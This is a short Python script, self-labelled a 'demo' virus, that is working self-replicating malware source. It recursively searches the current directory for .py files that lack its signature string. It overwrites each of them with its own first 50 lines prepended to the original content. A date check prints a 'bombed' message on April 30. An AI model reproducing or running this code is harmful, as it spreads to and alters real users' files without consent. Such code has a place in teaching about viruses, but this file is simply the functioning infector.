import os
import datetime as dt

SIGNATURE = "DEMO PYTHON VIRUS"


def search(path):
    files_to_infect = []
    file_list = os.listdir(path)
    for item_name in file_list:
        if os.path.isdir(path + '/' + item_name):
            files_to_infect.extend(search(
                path + '/' + item_name))  # if there are folders in the specified path, the function steps into each of the folders
        elif item_name[-3:] == '.py':
            infected = False
            for line in open(path + '/' + item_name):
                if SIGNATURE in line:
                    infected = True
                    break
            if not infected:
                files_to_infect.append(path + '/' + item_name)
        else:
            continue
    return files_to_infect


def infect(files_to_infect):
    virus = open(os.path.abspath(__file__))  # the script opens itself as a file object
    virus_string = ''
    for i, line in enumerate(virus):
        if i >= 0 and i < 50:
            virus_string += line
    virus.close()  # The function grabs the portion of code from the virus file that makes the virus spread
    for fname in files_to_infect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, 'w')
        f.write(virus_string + temp)
        f.close()
    return None


def bomb():
    files_to_infect = search(os.curdir)  # can point to any folder using search(os.path.abspath("C:/Users/..."))
    infect(files_to_infect)
    if dt.datetime.now().month == 4 and dt.datetime.now().day == 30:
        print("You have been bombed!")
    return None


if __name__ == '__main__':
    bomb()

